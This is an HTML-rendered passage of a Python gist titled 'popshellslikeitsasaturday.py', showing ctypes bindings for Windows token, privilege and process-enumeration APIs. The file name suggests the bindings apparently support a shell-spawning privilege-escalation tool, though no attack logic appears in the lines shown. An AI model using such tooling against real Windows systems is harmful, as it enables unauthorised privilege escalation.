        <td id="file-popshellslikeitsasaturday-py-L176" class="blob-num js-line-number" data-line-number="176"></td>
        <td id="file-popshellslikeitsasaturday-py-LC176" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c">#</span> Win32 API function definitions</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L177" class="blob-num js-line-number" data-line-number="177"></td>
        <td id="file-popshellslikeitsasaturday-py-LC177" class="blob-code blob-code-inner js-file-line">                                                                                      <span class="pl-c"><span class="pl-c">#</span> https://msdn.microsoft.com/en-us/library/windows/desktop/ff818516(v=vs.85).aspx</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L178" class="blob-num js-line-number" data-line-number="178"></td>
        <td id="file-popshellslikeitsasaturday-py-LC178" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L179" class="blob-num js-line-number" data-line-number="179"></td>
        <td id="file-popshellslikeitsasaturday-py-LC179" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c">#</span>Retrieves the calling thread&#39;s last-error code value. The last-error code is maintained on a per-thread basis. Multiple threads do not overwrite each other&#39;s last-error code.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L180" class="blob-num js-line-number" data-line-number="180"></td>
        <td id="file-popshellslikeitsasaturday-py-LC180" class="blob-code blob-code-inner js-file-line">GetLastError <span class="pl-k">=</span> windll.kernel32.GetLastError                                           <span class="pl-c"><span class="pl-c">#</span> https://msdn.microsoft.com/en-us/library/windows/desktop/ms679360(v=vs.85).aspx</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L181" class="blob-num js-line-number" data-line-number="181"></td>
        <td id="file-popshellslikeitsasaturday-py-LC181" class="blob-code blob-code-inner js-file-line">GetLastError.restype <span class="pl-k">=</span> <span class="pl-c1">DWORD</span>                                                         <span class="pl-c"><span class="pl-c">#</span> DWORD WINAPI GetLastError(void);</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L182" class="blob-num js-line-number" data-line-number="182"></td>
        <td id="file-popshellslikeitsasaturday-py-LC182" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L183" class="blob-num js-line-number" data-line-number="183"></td>
        <td id="file-popshellslikeitsasaturday-py-LC183" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c">#</span> Retrieves a pseudo handle for the current process</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L184" class="blob-num js-line-number" data-line-number="184"></td>
        <td id="file-popshellslikeitsasaturday-py-LC184" class="blob-code blob-code-inner js-file-line">GetCurrentProcess <span class="pl-k">=</span> kernel32.GetCurrentProcess                                        <span class="pl-c"><span class="pl-c">#</span> https://msdn.microsoft.com/en-us/library/windows/desktop/ms683179(v=vs.85).aspx</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L185" class="blob-num js-line-number" data-line-number="185"></td>
        <td id="file-popshellslikeitsasaturday-py-LC185" class="blob-code blob-code-inner js-file-line">GetCurrentProcess.restype <span class="pl-k">=</span> <span class="pl-c1">HANDLE</span>                                                   <span class="pl-c"><span class="pl-c">#</span> HANDLE WINAPI GetCurrentProcess(void);</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L186" class="blob-num js-line-number" data-line-number="186"></td>
        <td id="file-popshellslikeitsasaturday-py-LC186" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L187" class="blob-num js-line-number" data-line-number="187"></td>
        <td id="file-popshellslikeitsasaturday-py-LC187" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c">#</span> Closes an open object handle.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L188" class="blob-num js-line-number" data-line-number="188"></td>
        <td id="file-popshellslikeitsasaturday-py-LC188" class="blob-code blob-code-inner js-file-line">CloseHandle <span class="pl-k">=</span> kernel32.CloseHandle                                                    <span class="pl-c"><span class="pl-c">#</span> https://msdn.microsoft.com/en-us/library/windows/desktop/ms724211(v=vs.85).aspx</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L189" class="blob-num js-line-number" data-line-number="189"></td>
        <td id="file-popshellslikeitsasaturday-py-LC189" class="blob-code blob-code-inner js-file-line">CloseHandle.restype <span class="pl-k">=</span> <span class="pl-c1">BOOL</span>                                                           <span class="pl-c"><span class="pl-c">#</span> BOOL WINAPI CloseHandle</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L190" class="blob-num js-line-number" data-line-number="190"></td>
        <td id="file-popshellslikeitsasaturday-py-LC190" class="blob-code blob-code-inner js-file-line">CloseHandle.argtypes <span class="pl-k">=</span>  [                                                            <span class="pl-c"><span class="pl-c">#</span> (</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L191" class="blob-num js-line-number" data-line-number="191"></td>
        <td id="file-popshellslikeitsasaturday-py-LC191" class="blob-code blob-code-inner js-file-line">                  <span class="pl-c1">HANDLE</span>                                                             <span class="pl-c"><span class="pl-c">#</span> HANDLE hObject</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L192" class="blob-num js-line-number" data-line-number="192"></td>
        <td id="file-popshellslikeitsasaturday-py-LC192" class="blob-code blob-code-inner js-file-line">                  ]                                                                  <span class="pl-c"><span class="pl-c">#</span> );</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L193" class="blob-num js-line-number" data-line-number="193"></td>
        <td id="file-popshellslikeitsasaturday-py-LC193" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L194" class="blob-num js-line-number" data-line-number="194"></td>
        <td id="file-popshellslikeitsasaturday-py-LC194" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">PHANDLE</span> <span class="pl-k">=</span> POINTER(<span class="pl-c1">HANDLE</span>)</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L195" class="blob-num js-line-number" data-line-number="195"></td>
        <td id="file-popshellslikeitsasaturday-py-LC195" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c">#</span>  The OpenProcessToken function opens the access token associated with a process</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L196" class="blob-num js-line-number" data-line-number="196"></td>
        <td id="file-popshellslikeitsasaturday-py-LC196" class="blob-code blob-code-inner js-file-line">OpenProcessToken <span class="pl-k">=</span> advapi32.OpenProcessToken                                          <span class="pl-c"><span class="pl-c">#</span> https://msdn.microsoft.com/en-us/library/windows/desktop/aa379295(v=vs.85).aspx</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L197" class="blob-num js-line-number" data-line-number="197"></td>
        <td id="file-popshellslikeitsasaturday-py-LC197" class="blob-code blob-code-inner js-file-line">OpenProcessToken.restype <span class="pl-k">=</span> <span class="pl-c1">BOOL</span>                                                      <span class="pl-c"><span class="pl-c">#</span> BOOL WINAPI OpenProcessToken(</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L198" class="blob-num js-line-number" data-line-number="198"></td>
        <td id="file-popshellslikeitsasaturday-py-LC198" class="blob-code blob-code-inner js-file-line">OpenProcessToken.argtypes <span class="pl-k">=</span> [			                                     <span class="pl-c"><span class="pl-c">#</span> (</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L199" class="blob-num js-line-number" data-line-number="199"></td>
        <td id="file-popshellslikeitsasaturday-py-LC199" class="blob-code blob-code-inner js-file-line">	          <span class="pl-c1">HANDLE</span>,                                                            <span class="pl-c"><span class="pl-c">#</span> HANDLE  ProcessHandle,</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L200" class="blob-num js-line-number" data-line-number="200"></td>
        <td id="file-popshellslikeitsasaturday-py-LC200" class="blob-code blob-code-inner js-file-line">	          <span class="pl-c1">DWORD</span>,                                                             <span class="pl-c"><span class="pl-c">#</span> DWORD   DesiredAccess,</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L201" class="blob-num js-line-number" data-line-number="201"></td>
        <td id="file-popshellslikeitsasaturday-py-LC201" class="blob-code blob-code-inner js-file-line">	          <span class="pl-c1">PHANDLE</span>	                                                     <span class="pl-c"><span class="pl-c">#</span> PHANDLE TokenHandle</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L202" class="blob-num js-line-number" data-line-number="202"></td>
        <td id="file-popshellslikeitsasaturday-py-LC202" class="blob-code blob-code-inner js-file-line">	          ]		                                                     <span class="pl-c"><span class="pl-c">#</span> );</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L203" class="blob-num js-line-number" data-line-number="203"></td>
        <td id="file-popshellslikeitsasaturday-py-LC203" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L204" class="blob-num js-line-number" data-line-number="204"></td>
        <td id="file-popshellslikeitsasaturday-py-LC204" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">PDWORD</span> <span class="pl-k">=</span> POINTER(<span class="pl-c1">DWORD</span>)</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L205" class="blob-num js-line-number" data-line-number="205"></td>
        <td id="file-popshellslikeitsasaturday-py-LC205" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c">#</span> The GetTokenInformation function retrieves a specified type of information about an access token</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L206" class="blob-num js-line-number" data-line-number="206"></td>
        <td id="file-popshellslikeitsasaturday-py-LC206" class="blob-code blob-code-inner js-file-line">GetTokenInformation <span class="pl-k">=</span> advapi32.GetTokenInformation                                    <span class="pl-c"><span class="pl-c">#</span> https://msdn.microsoft.com/en-us/library/windows/desktop/aa446671(v=vs.85).aspx</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L207" class="blob-num js-line-number" data-line-number="207"></td>
        <td id="file-popshellslikeitsasaturday-py-LC207" class="blob-code blob-code-inner js-file-line">GetTokenInformation.restype <span class="pl-k">=</span>  <span class="pl-c1">BOOL</span>                                                  <span class="pl-c"><span class="pl-c">#</span> BOOL WINAPI GetTokenInformation</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L208" class="blob-num js-line-number" data-line-number="208"></td>
        <td id="file-popshellslikeitsasaturday-py-LC208" class="blob-code blob-code-inner js-file-line">GetTokenInformation.argtypes <span class="pl-k">=</span> [                                                     <span class="pl-c"><span class="pl-c">#</span> (</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L209" class="blob-num js-line-number" data-line-number="209"></td>
        <td id="file-popshellslikeitsasaturday-py-LC209" class="blob-code blob-code-inner js-file-line">                 <span class="pl-c1">HANDLE</span>,                                                             <span class="pl-c"><span class="pl-c">#</span> HANDLE                  TokenHandle,</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L210" class="blob-num js-line-number" data-line-number="210"></td>
        <td id="file-popshellslikeitsasaturday-py-LC210" class="blob-code blob-code-inner js-file-line">                 c_int,                                                              <span class="pl-c"><span class="pl-c">#</span> TOKEN_INFORMATION_CLASS TokenInformationClass, (TOKEN_INFORMATION_CLASS.enum (eg: TokenElevation) -&gt; cast to int (0x14))</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L211" class="blob-num js-line-number" data-line-number="211"></td>
        <td id="file-popshellslikeitsasaturday-py-LC211" class="blob-code blob-code-inner js-file-line">                 <span class="pl-c1">LPVOID</span>,                                                             <span class="pl-c"><span class="pl-c">#</span> LPVOID                  TokenInformation,</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L212" class="blob-num js-line-number" data-line-number="212"></td>
        <td id="file-popshellslikeitsasaturday-py-LC212" class="blob-code blob-code-inner js-file-line">                 <span class="pl-c1">DWORD</span>,                                                              <span class="pl-c"><span class="pl-c">#</span> DWORD                   TokenInformationLength,</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L213" class="blob-num js-line-number" data-line-number="213"></td>
        <td id="file-popshellslikeitsasaturday-py-LC213" class="blob-code blob-code-inner js-file-line">                 <span class="pl-c1">PDWORD</span>                                                              <span class="pl-c"><span class="pl-c">#</span> PDWORD                  ReturnLength</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L214" class="blob-num js-line-number" data-line-number="214"></td>
        <td id="file-popshellslikeitsasaturday-py-LC214" class="blob-code blob-code-inner js-file-line">                 ]                                                                   <span class="pl-c"><span class="pl-c">#</span> );</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L215" class="blob-num js-line-number" data-line-number="215"></td>
        <td id="file-popshellslikeitsasaturday-py-LC215" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L216" class="blob-num js-line-number" data-line-number="216"></td>
        <td id="file-popshellslikeitsasaturday-py-LC216" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c">#</span> Opens an existing local process object</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L217" class="blob-num js-line-number" data-line-number="217"></td>
        <td id="file-popshellslikeitsasaturday-py-LC217" class="blob-code blob-code-inner js-file-line">OpenProcess <span class="pl-k">=</span> kernel32.OpenProcess                                                    <span class="pl-c"><span class="pl-c">#</span> https://msdn.microsoft.com/en-us/library/windows/desktop/ms684320(v=vs.85).aspx</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L218" class="blob-num js-line-number" data-line-number="218"></td>
        <td id="file-popshellslikeitsasaturday-py-LC218" class="blob-code blob-code-inner js-file-line">OpenProcess.restype <span class="pl-k">=</span> <span class="pl-c1">HANDLE</span>                                                         <span class="pl-c"><span class="pl-c">#</span> HANDLE WINAPI OpenProcess</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L219" class="blob-num js-line-number" data-line-number="219"></td>
        <td id="file-popshellslikeitsasaturday-py-LC219" class="blob-code blob-code-inner js-file-line">OpenProcess.argtypes <span class="pl-k">=</span> [                                                             <span class="pl-c"><span class="pl-c">#</span> (</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L220" class="blob-num js-line-number" data-line-number="220"></td>
        <td id="file-popshellslikeitsasaturday-py-LC220" class="blob-code blob-code-inner js-file-line">                 <span class="pl-c1">DWORD</span>,                                                              <span class="pl-c"><span class="pl-c">#</span> DWORD dwDesiredAccess,</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L221" class="blob-num js-line-number" data-line-number="221"></td>
        <td id="file-popshellslikeitsasaturday-py-LC221" class="blob-code blob-code-inner js-file-line">                 <span class="pl-c1">BOOL</span>,                                                               <span class="pl-c"><span class="pl-c">#</span> BOOL  bInheritHandle,</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L222" class="blob-num js-line-number" data-line-number="222"></td>
        <td id="file-popshellslikeitsasaturday-py-LC222" class="blob-code blob-code-inner js-file-line">                 <span class="pl-c1">DWORD</span>                                                               <span class="pl-c"><span class="pl-c">#</span> DWORD dwProcessId</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L223" class="blob-num js-line-number" data-line-number="223"></td>
        <td id="file-popshellslikeitsasaturday-py-LC223" class="blob-code blob-code-inner js-file-line">                 ]                                                                   <span class="pl-c"><span class="pl-c">#</span> );</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L224" class="blob-num js-line-number" data-line-number="224"></td>
        <td id="file-popshellslikeitsasaturday-py-LC224" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c">#</span> Retrieves the process identifier of the calling process</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L225" class="blob-num js-line-number" data-line-number="225"></td>
        <td id="file-popshellslikeitsasaturday-py-LC225" class="blob-code blob-code-inner js-file-line">GetCurrentProcessId <span class="pl-k">=</span> kernel32.GetCurrentProcessId                                    <span class="pl-c"><span class="pl-c">#</span> https://msdn.microsoft.com/en-us/library/windows/desktop/ms683180(v=vs.85).aspx</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L226" class="blob-num js-line-number" data-line-number="226"></td>
        <td id="file-popshellslikeitsasaturday-py-LC226" class="blob-code blob-code-inner js-file-line">GetCurrentProcessId.restype <span class="pl-k">=</span> <span class="pl-c1">DWORD</span>                                                  <span class="pl-c"><span class="pl-c">#</span> DWORD WINAPI GetCurrentProcessId(void);</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L227" class="blob-num js-line-number" data-line-number="227"></td>
        <td id="file-popshellslikeitsasaturday-py-LC227" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L228" class="blob-num js-line-number" data-line-number="228"></td>
        <td id="file-popshellslikeitsasaturday-py-LC228" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c">#</span> Retrieves the base name of the specified module</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L229" class="blob-num js-line-number" data-line-number="229"></td>
        <td id="file-popshellslikeitsasaturday-py-LC229" class="blob-code blob-code-inner js-file-line">GetModuleBaseNameA <span class="pl-k">=</span> psapi.GetModuleBaseNameA                                         <span class="pl-c"><span class="pl-c">#</span> https://msdn.microsoft.com/en-us/library/windows/desktop/ms683196(v=vs.85).aspx</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L230" class="blob-num js-line-number" data-line-number="230"></td>
        <td id="file-popshellslikeitsasaturday-py-LC230" class="blob-code blob-code-inner js-file-line">GetModuleBaseNameA.restype <span class="pl-k">=</span> <span class="pl-c1">DWORD</span>                                                   <span class="pl-c"><span class="pl-c">#</span> DWORD WINAPI GetModuleBaseName</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L231" class="blob-num js-line-number" data-line-number="231"></td>
        <td id="file-popshellslikeitsasaturday-py-LC231" class="blob-code blob-code-inner js-file-line">GetModuleBaseNameA.argtypes <span class="pl-k">=</span> [                                                      <span class="pl-c"><span class="pl-c">#</span> (</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L232" class="blob-num js-line-number" data-line-number="232"></td>
        <td id="file-popshellslikeitsasaturday-py-LC232" class="blob-code blob-code-inner js-file-line">                 <span class="pl-c1">HANDLE</span>,                                                             <span class="pl-c"><span class="pl-c">#</span> HANDLE  hProcess,</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L233" class="blob-num js-line-number" data-line-number="233"></td>
        <td id="file-popshellslikeitsasaturday-py-LC233" class="blob-code blob-code-inner js-file-line">                 <span class="pl-c1">HMODULE</span>,                                                            <span class="pl-c"><span class="pl-c">#</span> HMODULE hModule,</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L234" class="blob-num js-line-number" data-line-number="234"></td>
        <td id="file-popshellslikeitsasaturday-py-LC234" class="blob-code blob-code-inner js-file-line">                 <span class="pl-c1">LPTSTR</span>,                                                             <span class="pl-c"><span class="pl-c">#</span> LPTSTR  lpBaseName,</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L235" class="blob-num js-line-number" data-line-number="235"></td>
        <td id="file-popshellslikeitsasaturday-py-LC235" class="blob-code blob-code-inner js-file-line">                 <span class="pl-c1">DWORD</span>                                                               <span class="pl-c"><span class="pl-c">#</span> DWORD   nSize</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L236" class="blob-num js-line-number" data-line-number="236"></td>
        <td id="file-popshellslikeitsasaturday-py-LC236" class="blob-code blob-code-inner js-file-line">                 ]                                                                   <span class="pl-c"><span class="pl-c">#</span> );</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L237" class="blob-num js-line-number" data-line-number="237"></td>
        <td id="file-popshellslikeitsasaturday-py-LC237" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L238" class="blob-num js-line-number" data-line-number="238"></td>
        <td id="file-popshellslikeitsasaturday-py-LC238" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L239" class="blob-num js-line-number" data-line-number="239"></td>
        <td id="file-popshellslikeitsasaturday-py-LC239" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">PTOKEN_PRIVILEGES</span> <span class="pl-k">=</span> <span class="pl-c1">LPVOID</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L240" class="blob-num js-line-number" data-line-number="240"></td>
        <td id="file-popshellslikeitsasaturday-py-LC240" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c">#</span> The AdjustTokenPrivileges function enables or disables privileges in the specified access token</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L241" class="blob-num js-line-number" data-line-number="241"></td>
        <td id="file-popshellslikeitsasaturday-py-LC241" class="blob-code blob-code-inner js-file-line">AdjustTokenPrivileges <span class="pl-k">=</span> advapi32.AdjustTokenPrivileges                                <span class="pl-c"><span class="pl-c">#</span> https://msdn.microsoft.com/en-us/library/windows/desktop/aa375202(v=vs.85).aspx</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L242" class="blob-num js-line-number" data-line-number="242"></td>
        <td id="file-popshellslikeitsasaturday-py-LC242" class="blob-code blob-code-inner js-file-line">AdjustTokenPrivileges.restype <span class="pl-k">=</span> <span class="pl-c1">BOOL</span>                                                 <span class="pl-c"><span class="pl-c">#</span> BOOL WINAPI AdjustTokenPrivileges</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L243" class="blob-num js-line-number" data-line-number="243"></td>
        <td id="file-popshellslikeitsasaturday-py-LC243" class="blob-code blob-code-inner js-file-line">AdjustTokenPrivileges.argtypes <span class="pl-k">=</span> [                                                   <span class="pl-c"><span class="pl-c">#</span> {</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L244" class="blob-num js-line-number" data-line-number="244"></td>
        <td id="file-popshellslikeitsasaturday-py-LC244" class="blob-code blob-code-inner js-file-line">                 <span class="pl-c1">HANDLE</span>,	                                                     <span class="pl-c"><span class="pl-c">#</span> HANDLE            TokenHandle,</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L245" class="blob-num js-line-number" data-line-number="245"></td>
        <td id="file-popshellslikeitsasaturday-py-LC245" class="blob-code blob-code-inner js-file-line">		 <span class="pl-c1">BOOL</span>,                                                               <span class="pl-c"><span class="pl-c">#</span> BOOL              DisableAllPrivileges,</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L246" class="blob-num js-line-number" data-line-number="246"></td>
        <td id="file-popshellslikeitsasaturday-py-LC246" class="blob-code blob-code-inner js-file-line">                 <span class="pl-c1">PTOKEN_PRIVILEGES</span>,                                                  <span class="pl-c"><span class="pl-c">#</span> PTOKEN_PRIVILEGES NewState,           # SE_PRIVILEGE_ENABLED = 0x00000002</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L247" class="blob-num js-line-number" data-line-number="247"></td>
        <td id="file-popshellslikeitsasaturday-py-LC247" class="blob-code blob-code-inner js-file-line">                 <span class="pl-c1">DWORD</span>,	                                                             <span class="pl-c"><span class="pl-c">#</span> DWORD             BufferLength,</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L248" class="blob-num js-line-number" data-line-number="248"></td>
        <td id="file-popshellslikeitsasaturday-py-LC248" class="blob-code blob-code-inner js-file-line">                 <span class="pl-c1">PTOKEN_PRIVILEGES</span>,                                                  <span class="pl-c"><span class="pl-c">#</span> PTOKEN_PRIVILEGES PreviousState,</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L249" class="blob-num js-line-number" data-line-number="249"></td>
        <td id="file-popshellslikeitsasaturday-py-LC249" class="blob-code blob-code-inner js-file-line">	         <span class="pl-c1">PDWORD</span>                                                              <span class="pl-c"><span class="pl-c">#</span> PDWORD            ReturnLength</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L250" class="blob-num js-line-number" data-line-number="250"></td>
        <td id="file-popshellslikeitsasaturday-py-LC250" class="blob-code blob-code-inner js-file-line">                 ]		                                                     <span class="pl-c"><span class="pl-c">#</span> }</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L251" class="blob-num js-line-number" data-line-number="251"></td>
        <td id="file-popshellslikeitsasaturday-py-LC251" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L252" class="blob-num js-line-number" data-line-number="252"></td>
        <td id="file-popshellslikeitsasaturday-py-LC252" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">PDWORD</span> <span class="pl-k">=</span> POINTER(<span class="pl-c1">DWORD</span>)</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L253" class="blob-num js-line-number" data-line-number="253"></td>
        <td id="file-popshellslikeitsasaturday-py-LC253" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c">#</span> Retrieves the process identifier for each process object in the system.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L254" class="blob-num js-line-number" data-line-number="254"></td>
        <td id="file-popshellslikeitsasaturday-py-LC254" class="blob-code blob-code-inner js-file-line">EnumProcesses <span class="pl-k">=</span> psapi.EnumProcesses                                                   <span class="pl-c"><span class="pl-c">#</span> https://msdn.microsoft.com/en-us/library/windows/desktop/ms682629(v=vs.85).aspx</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L255" class="blob-num js-line-number" data-line-number="255"></td>
        <td id="file-popshellslikeitsasaturday-py-LC255" class="blob-code blob-code-inner js-file-line">EnumProcesses.restype <span class="pl-k">=</span> <span class="pl-c1">BOOL</span>                                                         <span class="pl-c"><span class="pl-c">#</span> BOOL WINAPI EnumProcesses</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L256" class="blob-num js-line-number" data-line-number="256"></td>
        <td id="file-popshellslikeitsasaturday-py-LC256" class="blob-code blob-code-inner js-file-line">EnumProcesses.argtypes <span class="pl-k">=</span> [                                                           <span class="pl-c"><span class="pl-c">#</span> (</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L257" class="blob-num js-line-number" data-line-number="257"></td>
        <td id="file-popshellslikeitsasaturday-py-LC257" class="blob-code blob-code-inner js-file-line">                <span class="pl-c1">PDWORD</span>,                                                              <span class="pl-c"><span class="pl-c">#</span> DWORD *pProcessIds,</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L258" class="blob-num js-line-number" data-line-number="258"></td>
        <td id="file-popshellslikeitsasaturday-py-LC258" class="blob-code blob-code-inner js-file-line">                <span class="pl-c1">DWORD</span>,                                                               <span class="pl-c"><span class="pl-c">#</span> DWORD cb,</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L259" class="blob-num js-line-number" data-line-number="259"></td>
        <td id="file-popshellslikeitsasaturday-py-LC259" class="blob-code blob-code-inner js-file-line">                <span class="pl-c1">PDWORD</span>                                                               <span class="pl-c"><span class="pl-c">#</span> DWORD *pBytesReturned</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L260" class="blob-num js-line-number" data-line-number="260"></td>
        <td id="file-popshellslikeitsasaturday-py-LC260" class="blob-code blob-code-inner js-file-line">                ]                                                                    <span class="pl-c"><span class="pl-c">#</span> );</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L261" class="blob-num js-line-number" data-line-number="261"></td>
        <td id="file-popshellslikeitsasaturday-py-LC261" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L262" class="blob-num js-line-number" data-line-number="262"></td>
        <td id="file-popshellslikeitsasaturday-py-LC262" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c">#</span> Retrieves the name of the executable file for the specified process.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L263" class="blob-num js-line-number" data-line-number="263"></td>
        <td id="file-popshellslikeitsasaturday-py-LC263" class="blob-code blob-code-inner js-file-line">GetProcessImageFileName <span class="pl-k">=</span> psapi.GetProcessImageFileNameA                              <span class="pl-c"><span class="pl-c">#</span> https://msdn.microsoft.com/en-us/library/windows/desktop/ms683217(v=vs.85).aspx</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L264" class="blob-num js-line-number" data-line-number="264"></td>
        <td id="file-popshellslikeitsasaturday-py-LC264" class="blob-code blob-code-inner js-file-line">GetProcessImageFileName.restype <span class="pl-k">=</span> <span class="pl-c1">DWORD</span>                                              <span class="pl-c"><span class="pl-c">#</span> DWORD WINAPI GetProcessImageFileName</span></td>
      </tr>
      <tr>
